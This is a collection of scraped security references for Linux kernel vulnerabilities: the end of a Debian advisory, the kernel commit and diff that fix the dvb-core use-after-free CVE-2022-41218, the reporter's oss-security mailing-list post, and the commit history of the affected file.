    scheduler was prone to denial of service due to interpreting
    classification results before checking the classification
    return code.

CVE-2023-23455

    Kyle Zeng reported that the ATM Virtual Circuits (ATM) network
    scheduler was prone to a denial of service due to interpreting
    classification results before checking the classification
    return code.

For the stable distribution (bullseye), these problems have been fixed in
version 5.10.162-1.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmPO6CtfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0Ra0w//fLN39l/vLOzDs++lrDvYDVGpTFS/D3CfMq6ucxI36BEoxPXk5aKyH/la
red6SnuLf7lI+4CcH3vvLpo1vHreqOXRXoE/u1JdWij9vvLHyHjJKLgCkn43UlLN
ukdEnmls3DCJr42apdHhV7nyjLXfBzocgOfq8+oOUHS2/K2SPYc1dqtn96Dsmogu
nH/Mcorr9kHX1wjWtCPQCCSsjo3+xxRzc1WDpbdqolox979s7hFSIqZ65T74w/mV
KksIg/4CJHNlwo/piiwH6/Gi419v6Tj4HPUPcJpFEJou6adnnXqrBX+aNE9WvHEe
Y/Fmj2DSxBvCJ+MKzCVWNf94lfjxcb4mE8VlUxUTa6BR0BGC7/iKDz0HglYPnbue
zdNMEUcsgw3pxLB9sorFmcPbKOgzquwp2WLGCPxw04UMDmK5bBTZ/zKVa1b639C9
BGeOmDCfg9+b33Er9pKvvuky/C3divGbZ3TnWKcztVPR33Y2e2E1WtvvbLtayFsO
0ezn8r7vNCu+3hBTT09wXJQzil7o1zyfb9MwtzgSuxksLoFbm/B21rw1KEzTgyCC
FiQDJF2OQNmzKJokNgsmpIknx75/x1WG1UQbMeO15tZW8zSjItrDtiydw8Uyrs+8
BU0Ta3tiqtyOrlc22k+K2yDWrg16pRw9ik3iNokYgM7z/RcHwv4=
=7Ixp
-----END PGP SIGNATURE-----

```

---



=== Content from git.kernel.org_6e636b46_20250114_211828.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Takashi Iwai <tiwai@suse.de> | 2022-10-31 11:02:45 +0100 |
| --- | --- | --- |
| committer | Hans Verkuil <hverkuil-cisco@xs4all.nl> | 2022-11-04 16:56:43 +0100 |
| commit | [fd3d91ab1c6ab0628fe642dd570b56302c30a792](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)) | |
| tree | [1537b372fc2ae0a9b4a2fe0634f8017b9cb0295e](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792) | |
| parent | [00c47aa85bb26450edc6059c3d245de062e60b5d](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=00c47aa85bb26450edc6059c3d245de062e60b5d) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792&id2=00c47aa85bb26450edc6059c3d245de062e60b5d)) | |
| download | [linux-fd3d91ab1c6ab0628fe642dd570b56302c30a792.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-fd3d91ab1c6ab0628fe642dd570b56302c30a792.tar.gz) | |

media: dvb-core: Fix UAF due to refcount races at releasingThe dvb-core tries to sync the releases of opened files at
dvb\_dmxdev\_release() with two refcounts: dvbdev->users and
dvr\_dvbdev->users. A problem is present in those two syncs: when yet
another dvb\_demux\_open() is called during those sync waits,
dvb\_demux\_open() continues to process even if the device is being
closed. This includes the increment of the former refcount, resulting
in the leftover refcount after the sync of the latter refcount at
dvb\_dmxdev\_release(). It ends up with use-after-free, since the
function believes that all usages were gone and releases the
resources.
This patch addresses the problem by adding the check of dmxdev->exit
flag at dvb\_demux\_open(), just like dvb\_dvr\_open() already does. With
the exit flag check, the second call of dvb\_demux\_open() fails, hence
the further corruption can be avoided.
Also for avoiding the races of the dmxdev->exit flag reference, this
patch serializes the dmxdev->exit set up and the sync waits with the
dmxdev->mutex lock at dvb\_dmxdev\_release(). Without the mutex lock,
dvb\_demux\_open() (or dvb\_dvr\_open()) may run concurrently with
dvb\_dmxdev\_release(), which allows to skip the exit flag check and
continue the open process that is being closed.
CVE-2022-41218 is assigned to those bugs above.
Reported-by: Hyunwoo Kim <imv4bel@gmail.com>
Cc: <stable@vger.kernel.org>
Link: [https://lore.kernel.org/20220908132754.30532-1-tiwai@suse.de](https://lore.kernel.org/20220908132754.30532-1-tiwai%40suse.de)
Signed-off-by: Takashi Iwai <tiwai@suse.de>
Signed-off-by: Hans Verkuil <hverkuil-cisco@xs4all.nl>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)

| -rw-r--r-- | [drivers/media/dvb-core/dmxdev.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/drivers/media/dvb-core/dmxdev.c?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792) | 8 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 0 deletions

| diff --git a/drivers/media/dvb-core/dmxdev.c b/drivers/media/dvb-core/dmxdev.cindex f6ee678107d379..9ce5f010de3f84 100644--- a/[drivers/media/dvb-core/dmxdev.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/media/dvb-core/dmxdev.c?id=00c47aa85bb26450edc6059c3d245de062e60b5d)+++ b/[drivers/media/dvb-core/dmxdev.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/media/dvb-core/dmxdev.c?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792)@@ -790,6 +790,11 @@ static int dvb\_demux\_open(struct inode \*inode, struct file \*file) if (mutex\_lock\_interruptible(&dmxdev->mutex)) return -ERESTARTSYS; + if (dmxdev->exit) {+ mutex\_unlock(&dmxdev->mutex);+ return -ENODEV;+ }+ for (i = 0; i < dmxdev->filternum; i++) if (dmxdev->filter[i].state == DMXDEV\_STATE\_FREE) break;@@ -1448,7 +1453,10 @@ EXPORT\_SYMBOL(dvb\_dmxdev\_init);  void dvb\_dmxdev\_release(struct dmxdev \*dmxdev) {+ mutex\_lock(&dmxdev->mutex); dmxdev->exit = 1;+ mutex\_unlock(&dmxdev->mutex);+ if (dmxdev->dvbdev->users > 1) { wait\_event(dmxdev->dvbdev->wait\_queue, dmxdev->dvbdev->users == 1); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-14 21:17:05 +0000



=== Content from www.openwall.com_b07f959d_20250114_211828.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](../../../2022/09/27/1) [[<thread-prev]](1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220923190703.GA364581@ubuntu>
Date: Fri, 23 Sep 2022 12:07:03 -0700
From: Hyunwoo Kim <imv4bel@...il.com>
To: oss-security@...ts.openwall.com
Cc: imv4bel@...il.com
Subject: Re: [Report v2] CVE-2022-41218: Linux dvb-core: UAF in
 dvb-core/dmxdev

Dear,

There was a typo in the v1 patch, so I retransmitted the corrected v2 patch.

Best Regards,
Hyunwoo Kim.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from git.kernel.org_b8594ebc_20250114_211830.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/dvb-core/dmxdev.c)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/media/dvb-core/dmxdev.c)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/drivers/media/dvb-core/dmxdev.c)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/drivers/media/dvb-core/dmxdev.c) | log msg author committer range |
| --- | --- |

path: [root](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)/[drivers](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers)/[media](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media)/[dvb-core](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/dvb-core)/[dmxdev.c](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/dvb-core/dmxdev.c)

| Age | Commit message ([Expand](/pub/scm/linux/kernel/git/torvalds/linux.git/log/drivers/media/dvb-core/dmxdev.c?showmsg=1)) | Author | Files | Lines |
| --- | --- | --- | --- | --- |
| 2022-11-04 | [media: dvb-core: Fix UAF due to refcount races at releasing](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=fd3d91ab1c6ab0628fe642dd570b56302c30a792) | Takashi Iwai | 1 | -0/+8 |
| 2021-11-19 | [media: dvb-core: Convert to SPDX identifier](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=8d395ce6f04b4af8d2b7397e0fa2f849bd22c231) | Cai Huoqing | 1 | -11/+1 |
| 2021-11-19 | [media: dmxdev: fix UAF when dvb\_register\_device() fails](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=ab599eb11882f834951c436cc080c3455ba32b9b) | Wang Hai | 1 | -3/+15 |
| 2021-06-09 | [media: dmxdev: change the check for problems allocing secfeed](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=3d42c93e5fc9e67e0023b7242097f1c1c2cead01) | Mauro Carvalho Chehab | 1 | -1/+1 |
| 2019-02-18 | [media: dvb-core: fix epoll() by calling poll\_wait first](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=c6f5c7c237fb7179f3652a46108086c9178eb419) | Hans Verkuil | 1 | -4/+4 |
| 2018-09-12 | [media: dvb: dmxdev: move compat\_ioctl handling to dmxdev.c](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=b5d3206112dd20f33eba2364313cf85d7c0eb874) | Arnd Bergmann | 1 | -0/+1 |
| 2018-06-12 | [treewide: Use array\_size() in vmalloc()](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=42bc47b35320e0e587a88e437e18f80f9c5bcbb2) | Kees Cook | 1 | -1/+2 |
| 2018-05-09 | [media: Revert cleanup ktime\_set() usage](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=dde67d50ef0a5597ede14e9d1a689940713f380e) | Jasmin Jessich | 1 | -1/+1 |
| 2018-02-23 | [media: dvb: update buffer mmaped flags and frame counter](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=fdbeb96258141d911ca8ba98931b9024038b84e0) | Mauro Carvalho Chehab | 1 | -9/+15 |
| 2018-02-23 | [media: dmxdev: Fix the logic that enables DMA mmap support](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=0b23498aacc658e4d0f6b240f0b905908695a132) | Mauro Carvalho Chehab | 1 | -33/+42 |
| 2018-02-23 | [media: dmxdev: fix error code for invalid ioctls](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=a145f64c6107d3aa5a7cec9f8977d04ac2a896c9) | Mauro Carvalho Chehab | 1 | -1/+1 |
| 2018-02-23 | [media: dvb: fix DVB\_MMAP symbol name](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=ec5b100462543aee1f3e139e168699fd3b05cdc6) | Arnd Bergmann | 1 | -15/+15 |
| 2018-02-11 | [vfs: do bulk POLL\* -> EPOLL\* replacement](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=a9a08845e9acbd224e4ee466f5c1275ed50054e8) | Linus Torvalds | 1 | -7/+7 |
| 2018-02-06 | [Merge tag 'media/v4.16-2' of git://git.kernel.org/pub/scm/linux/kernel/git/mc...](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=68c5735eaa5e680e701c9a2d1e3c7880bdf5ab66) | Linus Torvalds | 1 | -21/+211 |
| 2017-12-28 | [media: move dvb kAPI headers to include/media](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=fada1935590f66dc6784981e0d557ca09013c847) | Mauro Carvalho Chehab | 1 | -2/+2 |
| 2017-12-28 | [media: dvb-core: make DVB mmap API optional](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=4021053ed52d57a2a1a3ec8355408fb290a23d9f) | Mauro Carvalho Chehab | 1 | -8/+58 |
| 2017-12-28 | [media: videobuf2: Add new uAPI for DVB streaming I/O](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=57868acc369ab73ec8f6b43a0c6749077376b189) | Satendra Singh Thakur | 1 | -28/+168 |
| 2017-11-27 | [media: annotate ->poll() instances](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=c23e0cb81e4021b9712b1093d54713991fd9b7c2) | Al Viro | 1 | -4/+4 |
| 2017-10-31 | [media: dvb-core: Convert timers to use timer\_setup()](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=e7e0e2cfd1169ff8b53cdc182b3c10be3e088e61) | Kees Cook | 1 | -5/+3 |
| 2017-09-05 | [media: get rid of removed DMX\_GET\_CAPS and DMX\_SET\_SOURCE leftovers](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=4cd7d6c957b085d319bcf97814f95854375da0a6) | Mauro Carvalho Chehab | 1 | -20/+0 |
| 2017-09-05 | [media: dmx.h: split typedefs from structs](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=3256b36ea36525945d8575c0100752819a309aaa) | Mauro Carvalho Chehab | 1 | -2/+2 |
| 2017-02-03 | [[media] media: dvb: dmx: fixed coding style issues of spacing](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=e90bbacd8ce475535d03ccb8ad88c1d55840580a) | devendra sharma | 1 | -5/+7 |
| 2017-01-27 | [[media] media: Drop FSF's postal address from the source code files](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=bcb63314e2c23f1ed622418b65f9409512659c73) | Sakari Ailus | 1 | -4/+0 |
| 2016-12-25 | [ktime: Cleanup ktime\_set() usage](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=8b0e195314fabd58a331c4f7b6db75a1565535d7) | Thomas Gleixner | 1 | -1/+1 |
| 2016-12-24 | [Replace <asm/uaccess.h> with <linux/uaccess.h> globally](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=7c0f6ba682b9c7632072ffbedf8d328c8f3c42ba) | Linus Torvalds | 1 | -1/+1 |
| 2016-10-21 | [[media] dvb-core: get rid of demux optional circular buffer](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=dd79d27e1bbded7366ade6d25fbfde305e33fad8) | Mauro Carvalho Chehab | 1 | -2/+2 |
| 2016-10-21 | [[media] dvb-core: use pr\_foo() instead of printk()](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=b3ad24d2e0b039834db28d06727dc9a675aa0396) | Mauro Carvalho Chehab | 1 | -9/+15 |
| 2016-07-08 | [[media] dvb: use ktime\_t for internal timeout](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=e95be15886ac9a931f540073c1c0db299e806f3c) | Arnd Bergmann | 1 | -1/+1 |
| 2016-01-11 | [[media] dvb: modify core to implement interfaces/entities at MC new gen](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=df2f94e563edcbcb4b8652d05a3789d03b395366) | Mauro Carvalho Chehab | 1 | -2/+2 |
| 2015-10-06 | [[media] dvb: get rid of enum dmx\_success](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=2f684b239cdbfcc1160392645a8fc056a68847ca) | Mauro Carvalho Chehab | 1 | -4/+2 |
| 2015-10-06 | [[media] dvb: don't keep support for undocumented features](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=1e92bbe08ad9fc0d5ec05174c176a9bc54921733) | Mauro Carvalho Chehab | 1 | -0/+4 |
| 2015-02-26 | [[media] dvb core: rename the media controller entities](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=e4fd3bc5049b67419ee91b3d4fee2d39e48d5dc2) | Mauro Carvalho Chehab | 1 | -2/+2 |
| 2015-02-13 | [[media] dmxdev: add support for demux/dvr nodes at media controller](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=8afd52ef92f8ff657965cef5f0da0a4bba04a361) | Mauro Carvalho Chehab | 1 | -3/+8 |
| 2014-09-03 | [[media] dmxdev: don't use before checking file->private\_data](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=313ddec45cf1a7b3778eaa9fd3acb31f994b2e88) | Mauro Carvalho Chehab | 1 | -2/+1 |
| 2014-09-02 | [[media] media: check status of dmxdev->exit in poll functions of demux&dvr](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=d102cac8097c71bbbba41f4d0cdf5b509d4c64cf) | Changbing Xiong | 1 | -1/+5 |
| 2014-09-02 | [[media] media: correct return value in dvb\_demux\_poll](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=236c9bfa4a133cbdfeeb3f7a1902950210549634) | Changbing Xiong | 1 | -1/+1 |
| 2013-10-24 | [dmxdev: get rid of pointless clearing ->f\_op](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=79b185dd1a40cf360c9d88ada7ed21f79d818613) | Al Viro | 1 | -4/+0 |
| 2013-06-19 | [[media] media: dmxdev: remove dvb\_ringbuffer\_flush() on writer side](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=414abbd2cd4c2618895f02ed3a76ec6647281436) | Soeren Moch | 1 | -6/+2 |
| 2013-04-08 | [[media] demux.h: Remove duplicated enum](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=fde04ab95d43e55959f12b92711b0ca4fed40637) | Mauro Carvalho Chehab | 1 | -1/+1 |
| 2013-03-04 | [[media] mb86a20s: change AGC tuning parameters](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=17e67d4c7fb7515ce98d3eb5de00c2575800818b) | Mauro Carvalho Chehab | 1 | -1/+2 |
| 2012-10-28 | [[media] dmxdev: fix a comparition of unsigned expression warning](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=31becf09caa8d7da2d5e40995782f477433e2cd9) | Mauro Carvalho Chehab | 1 | -1/+1 |
| 2012-08-13 | [[media] dvb: move the dvb core one level up](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/drivers/media/dvb-core/dmxdev.c?id=3d6c2bc08ac4f75bf3597740357c98f2207ca412) | Mauro Carvalho Chehab | 1 | -0/+1275 |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-14 21:17:07 +0000


